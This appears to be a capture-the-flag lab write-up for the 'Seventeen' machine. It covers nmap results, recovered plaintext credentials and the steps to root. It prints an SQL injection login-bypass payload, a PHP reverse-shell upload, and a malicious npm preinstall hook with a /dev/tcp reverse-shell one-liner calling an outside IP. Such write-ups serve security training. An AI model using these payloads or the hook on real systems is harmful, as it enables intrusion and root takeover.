# Seventeen
OS: Ubuntu

Web Technology: Drupal

IP: 10.129.183.81

USERS:
mark
administrator
steven
CREDENTIALS:
mark:2020bestyearofmylife
kavi:IhateMathematics123#

NMAP RESULTS:

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:b2:6e:bb:92:7d:5e:6b:36:93:17:1a:82:09:e4:64 (RSA)
|   256 1f:57:c6:53:fc:2d:8b:51:7d:30:42:02:a4:d6:5f:44 (ECDSA)
|_  256 d5:a5:36:38:19:fe:0d:67:79:16:e6:da:17:91:eb:ad (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Let's begin your education with us! 
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
8000/tcp open  http    Apache httpd 2.4.38
|_http-title: 403 Forbidden
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: Host: 172.17.0.11; OS: Linux; CPE: cpe:/o:linux:linux_kernel
#####################################################
Steps Taken():
[+] nmap -sC -sV -vvv -oN scan -iL IP
[+] subdomain and subdirectory enumeration
[+] Authentication bypass via http://seventeen.htb/vendor/oldmanagment login page
→ POST request stud_no=1' OR 1=1#&password=test&login=
same vulnerability exists on http://seventeen.htb/vendor/oldmanagement/admin/
as well as on port 8000 web page at http://seventeen.htb:8000/oldmanagement
[+] Functional File Upload once authenticated to access
http://seventeen.htb:8000/oldmanagement/student_profile.php 
[+] php-reverse-shell.php uploads properly and can be executed by navigating to http://seventeen.htb:8000/oldmanagement/files/12345/php-reverse-shell.php 
→ source code reveals the location of the uploaded file in save_file.php where $location = "files/".$stud_no."/".$file_name;
[+] /var/www/html/employeemanagementsystem/process/dbh.php
        $servername = "localhost";
        $dBUsername = "root";
        $dbPassword = "2020bestyearofmylife";
        $dBName = "ems";
[+] the password is being reused by the user mark, which grants ssh access to the host machine
[+] Another user ‘kavi’ is discovered on the machine
[+] there is an app inside the /opt/ directory which contains a db-logger/ → logger.json file
var mysql = require('mysql');
var con = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "IhateMathematics123#",
  database: "logger"
});
the file contains credentials
[+] the password is being reused by the user kavi, which grants ssh access to the host machine
[+] User kavi may run the following commands on seventeen: (ALL) /opt/app/startup.sh
→ user kavi can run the startup.sh program with sudo privileges
→ the program grants kavi write permissions to the mysql directory (for reasons unknow)
drwxr-xr-x  3 kavi kavi 4096 May 29 02:47 mysql
[+] the mysql/package.json file is being run as root when the ‘sudo ./startup.sh’ command is given
[+] with write permission to this directory, we can create our own delete the package.json file and inject a malicious preinstall script into a custom package.json file
[+] the .npmrc file is located within kavi's home directory, which needs to have ‘unsafe-perm=true’ in order to allow npm install to run as root
[+] with a reverse shell injected into the script section:
"preinstall": "bash -c 'exec bash -i &>/dev/tcp/10.10.14.28/1337 <&1'",
and a netcat listener running on the attack machine, executing the ‘sudo ./startup.sh’ command gives us a reverse shell 

#####################################################
Web Services Enumeration:  

DIRECTORIES:  /  (Web Root) 
[80]
http://seventeen.htb/
css  
images 
js  
fonts  
vendor/
        → exams/
           ⇒ exams - admin
           ⇒ exams - plugins
           ⇒ exams - uploads
           ⇒ exams - assets
           ⇒ exams - inc
           ⇒ exams - classes
           ⇒ exams - database
           ⇒ exams - libs
           ⇒ exams - build
           ⇒ exams - dist

        → oldmanagement/
           ⇒ login page for students
           ⇒ vulnerable to sql injection
           ⇒ stud_no=1' OR 1=1#&password=test&login=
                  • vendor/oldmanagement/student_profile.php
                  • broken upload file 
           ⇒ oldmanagement - admin
           ⇒ oldmanagement - files
           ⇒ oldmanagement - db

        → mastermailer/
           ⇒ mastermailer - plugins
           ⇒ mastermailer - bin
           ⇒ mastermailer - temp
           ⇒ mastermailer - logs
           ⇒ mastermailer - config
           ⇒ mastermailer - skins
           ⇒ mastermailer - public_html
           ⇒ mastermailer - installer
           ⇒ mastermailer - program
           ⇒ mastermailer - vendor
           ⇒ mastermailer - INSTALL
           ⇒ mastermailer - SQL
           ⇒ mastermailer - CHANGELOG
           ⇒ mastermailer - LICENSE

http://exam.seventeen.htb/

[8000]
http://seventeen.htb:8000/
        → oldmanagement 
                → admin
                → files 
           ⇒ login page for students
           ⇒ vulnerable to sql injection
           ⇒ stud_no=1' OR 1=1#&password=test&login=
                  • vendor/oldmanagement/student_profile.php
        → mastermailer
        mastermailer - plugins
        mastermailer - bin
        mastermailer - skins
        mastermailer - public_html
        mastermailer - installer
        mastermailer - program
        mastermailer - vendor
        mastermailer - INSTALL
        mastermailer - SQL
        mastermailer - CHANGELOG
        mastermailer - LICENSE

#pdf found in http://seventeen.htb/vendor/oldmanagment/files references mastermailer.seventeen.htb:8000 
http://mastermailer.seventeen.htb:8000/

